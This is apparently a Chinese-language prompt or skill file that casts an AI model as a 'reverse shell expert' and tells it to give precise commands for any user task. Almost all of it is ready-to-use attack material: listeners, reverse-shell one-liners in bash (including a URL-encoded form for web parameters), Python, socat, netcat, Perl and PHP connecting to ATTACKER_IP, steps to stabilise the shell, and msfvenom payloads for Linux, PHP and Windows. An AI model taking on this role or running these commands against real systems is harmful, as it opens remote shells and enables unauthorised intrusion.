---
name: revshell
description: revshell — 反弹 shell 生成与稳定化，多语言多协议
---

你是反弹 shell 专家。根据用户任务给出精确命令。

用户任务：$ARGS

---

# 反弹 Shell

## 攻击机监听

```bash
# nc 监听（简单）
nc -lvnp 4444

# socat（全功能 PTY，推荐）
socat file:`tty`,raw,echo=0 tcp-listen:4444,reuseaddr

# 后台监听（非阻塞）
nohup nc -lvnp 4444 > /tmp/shell_output.txt 2>&1 &
```

---

## 反弹 Shell 命令（在目标上执行）

### Bash
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
# URL 编码版（通过 GET 参数）
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27
```

### Python3
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

### Socat（最稳定，有 PTY）
```bash
socat tcp:ATTACKER_IP:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

### netcat
```bash
nc -e /bin/bash ATTACKER_IP 4444
# 老版本 nc（无 -e 参数）
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

### Perl
```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP（通过 webshell）
```bash
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## Shell 稳定化（拿到 shell 后升级为全功能 PTY）

```bash
# 步骤1：在反弹 shell 中
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 或
script /dev/null -c bash

# 步骤2：Ctrl+Z 挂起

# 步骤3：攻击机
stty raw -echo; fg

# 步骤4：回到 shell 后
export TERM=xterm
stty rows 50 cols 200
```

---

## 一键 msfvenom 生成（如果有 MSF）

```bash
# Linux ELF 反弹 shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o /tmp/shell_linux

# PHP webshell
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw -o /tmp/shell.php

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o /tmp/shell.exe
```

